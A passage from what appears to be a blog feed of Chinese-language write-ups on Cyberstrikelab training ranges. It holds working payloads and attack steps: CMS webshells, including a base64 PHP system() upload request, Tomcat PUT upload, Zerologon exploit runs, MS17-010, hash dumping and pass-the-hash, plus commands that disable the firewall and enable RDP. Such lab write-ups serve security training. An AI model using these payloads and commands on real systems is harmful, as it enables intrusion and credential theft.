unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 18.63 seconds\n```\n\n`HTTP` 端口在`3590`\n\n```php\n➜  Lab3 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:44 CST\nNmap scan report for 192.168.10.10\nHost is up (0.054s latency).\n                                                \nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                             \n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  \n445/tcp   open  microsoft-ds?\n3306/tcp  open  mysql         MySQL (unauthorized)\n3590/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n|_http-title:  taoCMS\\xE6\\xBC\\x94\\xE7\\xA4\\xBA\n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n5040/tcp  open  unknown\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 21H2 (92%), M\nicrosoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%\n)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -8h00m00s                                                                         \n| smb2-security-mode:                                                                           \n|   3:1:1:                                                                                      \n|_    Message signing enabled but not required                                                  \n| smb2-time:                                                                                    \n|   date: 2025-08-12T05:47:37                                                                   \n|_  start_date: N/A                                                                             \n                                                                                                                                                                                                \nTRACEROUTE (using proto 1/icmp)                                                                                                                                                                 \nHOP RTT      ADDRESS                                                                                                                                                                            \n1   50.73 ms 172.16.233.1\n2   50.81 ms 192.168.10.10                                                                      \n                                                \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 178.96 seconds\n```\n\n## 192.168.10.10\n\n### taoCMS\n\n访问 `Web` 站点\n\n![image.png](/post-images/CyberstrikelabLab3/image.png)\n\n寻找公开漏洞\n\n> https://blog.csdn.net/2302_82189125/article/details/140086872\n> \n\n使用默认账号密码成功进去了\n\n![image.png](/post-images/CyberstrikelabLab3/image1.png)\n\n来到文件管理页面，新建文件\n\n![image.png](/post-images/CyberstrikelabLab3/image2.png)\n\n点击编辑写马子进去就行了\n\n![image.png](/post-images/CyberstrikelabLab3/image3.png)\n\n`system` 权限\n\n![image.png](/post-images/CyberstrikelabLab3/image4.png)\n\n直接上 `Vshell` ，首先关闭防火墙和开启远程桌面\n\n![image.png](/post-images/CyberstrikelabLab3/image5.png)\n\n通过一键上线命令\n\n![image.png](/post-images/CyberstrikelabLab3/image6.png)\n\n### 信息收集\n\n读取 `flag1`\n\n```php\nC:\\phpstudy_pro\\WWW>type C:\\flag.txt\ngo-flag{IpbKNIOigmnsuwY3}\n```\n\n查看网段信息\n\n```php\nC:\\phpstudy_pro\\WWW>ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网实例 0:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::81e3:1433:2412:22d8%17\n   IPv4 地址 . . . . . . . . . . . . : 192.168.10.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.10.233\n\n以太网适配器 以太网实例 0 2:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::edc1:3601:4f28:7fc4%11\n   IPv4 地址 . . . . . . . . . . . . : 192.168.20.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.20.1\n```\n\n存在 `192.168.20.0` 网段，加上 `flag` 的提示\n\n![image.png](/post-images/CyberstrikelabLab3/image7.png)\n\n上传 `fscan` 扫描，先打 `192.168.20.20`\n\n## 192.168.20.20\n\n### 信息收集\n\n`fscan` 扫描，`8055` 是 `web` 服务\n\n```php\nC:\\>fscan -h 192.168.20.20 -nobr -p 1-65535\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-12 14:31:40] [INFO] 暴力破解线程数: 1\n[2025-08-12 14:31:40] [INFO] 开始信息扫描\n[2025-08-12 14:31:40] [INFO] 最终有效主机数量: 1\n[2025-08-12 14:31:40] [INFO] 开始主机扫描\n[2025-08-12 14:31:40] [INFO] 有效端口数量: 65535\n[2025-08-12 14:31:45] [SUCCESS] 端口开放 192.168.20.20:135\n[2025-08-12 14:31:45] [SUCCESS] 端口开放 192.168.20.20:139\n[2025-08-12 14:31:50] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]\n[2025-08-12 14:31:57] [SUCCESS] 端口开放 192.168.20.20:445\n[2025-08-12 14:32:02] [SUCCESS] 服务识别 192.168.20.20:445 => \n[2025-08-12 14:32:50] [SUCCESS] 服务识别 192.168.20.20:135 => \n[2025-08-12 14:33:43] [SUCCESS] 端口开放 192.168.20.20:3306\n[2025-08-12 14:33:43] [SUCCESS] 服务识别 192.168.20.20:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed\nto connect to this MySQL server]\n[2025-08-12 14:35:13] [SUCCESS] 端口开放 192.168.20.20:5985\n[2025-08-12 14:35:19] [SUCCESS] 服务识别 192.168.20.20:5985 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows\n[2025-08-12 14:36:24] [SUCCESS] 端口开放 192.168.20.20:8055\n[2025-08-12 14:36:35] [SUCCESS] 服务识别 192.168.20.20:8055 => [http]\n```\n\n通过 `Vshell` 设置 `socks` 代理，然后给 `yakit` 设置下游代理即可访问\n\n![image.png](/post-images/CyberstrikelabLab3/image8.png)\n\n是 `thinkphp`，提示说被渗透过了\n\n这里扫描了一波没扫描出来，可能网站被挂马了，爆破一下\n\n这里尝试了使用 `ffuf` 和 `wfuzz` 来进行爆破，但是并不理想\n\n### **awBruter**\n\n看了一下 `WP` ，是通过 `awBruter` 来爆破，爆破得到密码 `admin123`\n\n![image.png](/post-images/CyberstrikelabLab3/image9.png)\n\n蚁剑连接\n\n![image.png](/post-images/CyberstrikelabLab3/image10.png)\n\n被挂马的地方：\n\n![image.png](/post-images/CyberstrikelabLab3/image11.png)\n\n查看权限\n\n![image.png](/post-images/CyberstrikelabLab3/image12.png)\n\n读取 `flag2`\n\n```php\nC:\\> type flag.txt\ngo-flag{C2AoW93mioh5XYQg}\n```\n\n上线有点麻烦就算了，通过 `stowaway` 或者 `chisel` 弄一个端口映射就行\n\n## 192.168.20.30\n\n### 信息收集\n\n通过 `192.168.20.20` 能知道 `192.168.20.30` 就是 `DC`\n\n![image.png](/post-images/CyberstrikelabLab3/image13.png)\n\n`fscan` 扫描\n\n```php\nC:\\>fscan.exe -h 192.168.20.30 -nobr\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-12 15:21:41] [INFO] 暴力破解线程数: 1\n[2025-08-12 15:21:41] [INFO] 开始信息扫描\n[2025-08-12 15:21:41] [INFO] 最终有效主机数量: 1\n[2025-08-12 15:21:42] [INFO] 开始主机扫描\n[2025-08-12 15:21:42] [INFO] 有效端口数量: 233\n[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:445\n[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:389\n[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:139\n[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:135\n[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:88\n[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:445 => \n[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]\n[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:88 => \n[2025-08-12 15:21:52] [SUCCESS] 服务识别 192.168.20.30:389 => \n[2025-08-12 15:22:47] [SUCCESS] 服务识别 192.168.20.30:135 => \n[2025-08-12 15:22:47] [INFO] 存活端口数量: 5\n[2025-08-12 15:22:47] [INFO] 开始漏洞扫描\n[2025-08-12 15:22:47] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 15:22:47] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.30\n主机名: WIN-7NRTJO59O7N\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.30\n[2025-08-12 15:22:48] [SUCCESS] 扫描已完成: 9/9\n```\n\n尝试 `SMB` 匿名\n\n```php\n➜  fscan proxychains -q nxc smb 192.168.20.30 -u anonymous -p ''\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) \nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\\anonymous: STATUS_LOGON_FAILURE\n```\n\n没什么发现的，尝试一下公开漏洞，测试一下 `zerologon`\n\n### zerologon\n\n> POC：https://github.com/SecuraBV/CVE-2020-1472\n> \n\n```php\n➜  CVE-2020-1472 git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n==============================================================================\nSuccess! DC can be fully compromised by a Zerologon attack\n```\n\n再利用 exp\n\n> https://github.com/dirkjanm/CVE-2020-1472\n> \n\n```php\n➜  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n=====================================================================================================================================\nTarget vulnerable, changing account password to empty string\n\nResult: 0\n\nExploit complete!\n```\n\n然后直接 `Dumphash`\n\n![image.png](/post-images/CyberstrikelabLab3/image14.png)\n\n`PTH`\n\n![image.png](/post-images/CyberstrikelabLab3/image15.png)\n\n读取 flag\n\n```php\nC:\\Windows\\system32> type C:\\flag.txt\ngo-flag{ueoJt7eB6AQL8OpL}\n```",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3",
            "title": "Cyberstrikelab - Lab3",
            "summary": "Lab3 https://www.cyberstrikelab.com/#/scene/detail/22 Recon 提示 192.168.10.0 网段 扫描出来 192.168.10.10 HTTP 端口在3590 192.168.10.10 taoCMS 访问 Web 站点 寻找公开漏洞 h...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Cyberstrikelab",
                "Windows",
                "taoCMS",
                "多层内网",
                "zerologon"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2",
            "content_html": "\n# Lab2\n\n> https://www.cyberstrikelab.com/#/scene/detail/21\n> \n\n## 192.168.10.10\n\n### Recon\n\n端口扫描\n\n```php\n➜  Lab2 nmap -sT -min-rate 5000 -p- 192.168.10.10                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:36 CST\nNmap scan report for 192.168.10.10\nHost is up (0.053s latency).\nNot shown: 65521 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n808/tcp   open  ccproxy-http\n3306/tcp  open  mysql\n5040/tcp  open  unknown\n7680/tcp  open  pando-pub\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 14.64 seconds\n```\n\n`808` 是 `web` 服务\n\n```php\n➜  Lab2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:37 CST\nStats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 92.86% done; ETC: 18:40 (0:00:10 remaining)\nNmap scan report for 192.168.10.10\nHost is up (0.054s latency).\n\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n808/tcp   open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n|_http-title: \\xE9\\xAA\\x91\\xE5\\xA3\\xABPHP\\xE9\\xAB\\x98\\xE7\\xAB\\xAF\\xE4\\xBA\\xBA\\xE6\\x89\\x8D\\xE7\\xB3\\xBB\\xE7\\xBB\\x9F(www.74cms.com)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n3306/tcp  open  mysql         MySQL (unauthorized)\n5040/tcp  open  unknown\n7680/tcp  open  pando-pub?\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2025-08-12T02:40:41\n|_  start_date: N/A\n|_clock-skew: -8h00m00s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   53.19 ms 172.16.233.1\n2   53.32 ms 192.168.10.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 181.60 seconds\n```\n\n### 骑士 CMS\n\n访问 `808` 端口\n\n![image.png](/post-images/CyberstrikelabLab2/image.png)\n\n在页尾中能找到 `Powered by 74cms v4.2.111` \n\n通过搜寻，存在后台 `getshell` \n\n先测试是否存在弱密码，后台页面：`http://192.168.10.10:808/index.php?m=admin&c=index&a=login`\n\n通过弱密码 `admin`:`admin123456` 进入后台\n\n![image.png](/post-images/CyberstrikelabLab2/image1.png)\n\n> 利用链接：https://blog.csdn.net/m0_63253040/article/details/127041028\n> \n\n![image.png](/post-images/CyberstrikelabLab2/image2.png)\n\n然后访问 `/Application/Home/Conf/config.php`\n\n![image.png](/post-images/CyberstrikelabLab2/image3.png)\n\n反弹 `shell`\n\n![image.png](/post-images/CyberstrikelabLab2/image4.png)\n\n![image.png](/post-images/CyberstrikelabLab2/image5.png)\n\n上线 `Vshell` \n\n首先将防火墙和远程桌面打开\n\n```php\nPS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\nThe operation completed successfully.\n\nPS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> netsh advfirewall set allprofiles state off\nOk.\n```\n\n通过一键上线命令上线，传`payload` 也可以\n\n![image.png](/post-images/CyberstrikelabLab2/image6.png)\n\n### 信息收集\n\n读取第一个 `flag.txt`\n\n```php\nC:\\>type flag.txt\ngo-flag{MP9E4xXhya0TlzVF}\n```\n\n`IP` 信息，很奇怪，为什么只有一个网络\n\n```php\nC:\\>ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网实例 0:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::81d8:7722:88a0:5578%12\n   IPv4 地址 . . . . . . . . . . . . : 192.168.10.10\n   子网掩码  . . . . . . . . . . . . : 255.255.255.0\n   默认网关. . . . . . . . . . . . . : 192.168.10.233\n```\n\n我么对网段段进行扫描，存在三台机子\n\n```php\n➜  Lab2 nmap -sn 192.168.10.0/24                                                          \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 19:01 CST\nNmap scan report for 192.168.10.10\nHost is up (0.056s latency).\nNmap scan report for 192.168.10.20\nHost is up (0.058s latency).\nNmap scan report for 192.168.10.233\nHost is up (0.061s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 7.37 seconds\n```\n\n`Fscan` 扫描一下\n\n```php\n➜  fscan ./fscan_1.8.4 -h 192.168.10.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 192.168.10.10   is alive\n(icmp) Target 192.168.10.20   is alive\n(icmp) Target 192.168.10.233  is alive\n[*] Icmp alive hosts len is: 3\n192.168.10.10:139 open\n192.168.10.20:135 open\n192.168.10.10:3306 open\n192.168.10.10:135 open\n192.168.10.233:22 open\n192.168.10.20:445 open\n192.168.10.20:139 open\n192.168.10.10:445 open\n192.168.10.20:8080 open\n192.168.10.10:7680 open\n192.168.10.233:8080 open\n192.168.10.10:808 open\n192.168.10.20:8009 open\n[*] alive ports len is: 13\nstart vulscan\n[*] NetInfo \n[*]192.168.10.10\n   [->]DESKTOP-JFB57A8\n   [->]192.168.10.10\n[*] WebTitle https://192.168.10.233:8080 code:404 len:19     title:None\n[*] NetBios 192.168.10.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[*] WebTitle http://192.168.10.20:8080 code:200 len:11432  title:Apache Tomcat/8.5.19\n[*] WebTitle http://192.168.10.10:808  code:404 len:1331   title:系统发生错误\n[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell \n[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce \n```\n\n`192.168.10.20` 扫描出来两个洞\n\n## 192.168.10.20\n\n### cve-2017-12615\n\n访问 `8080` 端口\n\n![image.png](/post-images/CyberstrikelabLab2/image7.png)\n\n之前在 `Fscan` 扫描出来 `cve-2017-12615`\n\n> https://www.cnblogs.com/confidant/p/15440233.html\n> \n\n![image.png](/post-images/CyberstrikelabLab2/image8.png)\n\n连上冰蝎\n\n![image.png](/post-images/CyberstrikelabLab2/image9.png)\n\n### 提权\n\n查看权限\n\n```php\nC:/Program Files/Apache Software Foundation/Tomcat 8.5/ >whoami /all\n\n用户信息\n----------------\n\n用户名                       SID     \n============================ ========\nnt authority\\network service S-1-5-20\n\n组信息\n-----------------\n\n组名                                   类型   SID          属性                          \n====================================== ====== ============ ==============================\nMandatory Label\\System Mandatory Level 标签   S-1-16-16384                               \nEveryone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组\nBUILTIN\\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\SERVICE                   已知组 S-1-5-6      必需的组, 启用于默认, 启用的组\nCONSOLE LOGON                          已知组 S-1-2-1      必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组\nLOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组\n\n特权信息\n----------------------\n\n特权名                        描述                 状态  \n============================= ==================== ======\nSeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用\nSeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用\nSeAuditPrivilege              生成安全审核         已禁用\nSeChangeNotifyPrivilege       绕过遍历检查         已启用\nSeImpersonatePrivilege        身份验证后模拟客户端 已启用\nSeCreateGlobalPrivilege       创建全局对象         已启用\nSeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用\n```\n\n可以打 `SweetPotato` ，但是不知道为什么打不上，这里上线 `MSF` 来打\n\n```php\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 172.16.233.2:4444 \n[*] Sending stage (203846 bytes) to 192.168.10.20\n[*] Meterpreter session 1 opened (172.16.233.2:4444 -> 192.168.10.20:49220) at 2025-08-12 20:22:41 +0800\n\nmeterpreter > getsystem\n...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n\n成功获得 `system` 权限\n\n读第二个 `flag`\n\n```php\nC:\\>type flag.txt\ngo-flag{2a1AygwfTuccnNJY}\n```\n\n### 信息收集\n\n还有二层内网\n\n![image.png](/post-images/CyberstrikelabLab2/image10.png)\n\n上线 `Vshell` ，直接弹即可\n\n![image.png](/post-images/CyberstrikelabLab2/image11.png)\n\n`Fscan` 扫描发现 `192.168.20.30` 存在永恒之蓝，要走代理打\n\n![image.png](/post-images/CyberstrikelabLab2/image12.png)\n\n可以直接在 `Vshell` 上进行代理\n\n选择 `192.168.10.20` 然后点击隧道代理\n\n![image.png](/post-images/CyberstrikelabLab2/image13.png)\n\n`Kali` 连接即可\n\n```php\n➜  Lab2 tail -n 1 /etc/proxychains4.conf\nsocks5  127.0.0.1       2131    admin   admin\n➜  Lab2 proxychains curl 192.168.20.30:8080\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:8080  ...  OK\ncurl: (52) Empty reply from server\n```\n\n## 192.168.20.30\n\n### 永恒之蓝\n\n通过代理启动 `MSF`\n\n```php\n➜  Lab2 proxychains -q msfconsole                                                                                                                                      \nMetasploit tip: The use command supports fuzzy searching to try and \nselect the intended module, e.g. use kerberos/get_ticket or use \nkerberos forge silver ticket\n                                                  \nIIIIII    dTb.dTb        _.---._\n  II     4'  v  'B   .'\"\".'/|\\`.\"\"'.\n  II     6.     .P  :  .' / | \\ `.  :\n  II     'T;. .;P'  '.'  /  |  \\  `.'\n  II      'T; ;P'    `. /   |   \\ .'\nIIIIII     'YvP'       `-.__|__.-'\n\nI love shells --egypt\n\n       =[ metasploit v6.4.69-dev                          ]\n+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]\n+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > \n```\n\n打 `command` 就好了，直接读 `flag`\n\n```php\nmsf6 > search ms17\nmsf6 > use 19\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"type C:\\flag.txt\"\ncommand => type C:\\flag.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30\nrhost => 192.168.20.30\n```\n\n![image.png](/post-images/CyberstrikelabLab2/image14.png)",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2",
            "title": "Cyberstrikelab - Lab2",
            "summary": "Lab2 https://www.cyberstrikelab.com/#/scene/detail/21 192.168.10.10 Recon 端口扫描 808 是 web 服务 骑士 CMS 访问 808 端口 在页尾中能找到 Powered by 74cms v4.2.111 通过搜寻，存在...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Cyberstrikelab",
                "Windows",
                "Tomcat",
                "Vshell",
                "多层内网",
                "MS17_010"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1",
            "content_html": "\n# Lab-1\n\n> https://www.cyberstrikelab.com/#/scene/detail/20\n> \n\n## Youcms\n\n`youcms`\n\n![image.png](/post-images/CyberstrikelabLab-1/image.png)\n\n网上能找到 `youcms` 前台 `getshell` 的利用\n\n> https://blog.csdn.net/qq_48985780/article/details/121945304\n> \n\n```php\nPOST /index.php/api/Uploadify/preview HTTP/1.1\nHost: 192.168.10.10\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept-Encoding: gzip, deflate\nSec-GPC: 1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgcGhwaW5mbygpOw==\n```\n\n访问返回包中的 `preview/xxxxxxx.php`\n\n![image.png](/post-images/CyberstrikelabLab-1/image1.png)\n\n写入一句话木马\n\n```php\nPOST /index.php/api/Uploadify/preview HTTP/1.1\nHost: 192.168.10.10\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept-Encoding: gzip, deflate\nSec-GPC: 1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=\n```\n\n测试，是 `windows`\n\n![image.png](/post-images/CyberstrikelabLab-1/image2.png)\n\n## 192.168.10.10\n\n进行反弹 `shell`\n\n![image.png](/post-images/CyberstrikelabLab-1/image3.png)\n\n![image.png](/post-images/CyberstrikelabLab-1/image4.png)\n\n先把防火墙关了，然后开启远程桌面\n\n```php\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> netsh advfirewall set allprofiles state off\nOk.\n\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\nThe operation completed successfully.\n```\n\n之后再上线 `Vshell` ，使用一键上线命令即可\n\n![image.png](/post-images/CyberstrikelabLab-1/image5.png)\n\n`C` 盘根目录第一个 flag\n\n```php\nC:\\>type flag.txt\ngo-flag{kn6anDUCzBqtjlX8}\n```\n\n这里为了方便所以上 `MSF` 抓了下 `HASH`\n\n![image.png](/post-images/CyberstrikelabLab-1/image6.png)\n\n这里可以使用 `evil-winrm` 进行登陆了\n\n```php\nmeterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername       Domain           NTLM                              SHA1\n--------       ------           ----                              ----\nAdministrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  8b8bca113dee7e588272b1ca6b73b16d017d4434\n\nwdigest credentials\n===================\n\nUsername          Domain           Password\n--------          ------           --------\n(null)            (null)           (null)\nAdministrator     WIN-KOHRC1DGOL9  (null)\nWIN-KOHRC1DGOL9$  WORKGROUP        (null)\n\nkerberos credentials\n====================\n\nUsername          Domain           Password\n--------          ------           --------\n(null)            (null)           (null)\nAdministrator     WIN-KOHRC1DGOL9  (null)\nwin-kohrc1dgol9$  WORKGROUP        (null)\n```\n\n`IP` 信息\n\n```php\nC:\\>ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网 3:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::f934:2031:ffb0:abe5%17\n   IPv4 地址 . . . . . . . . . . . 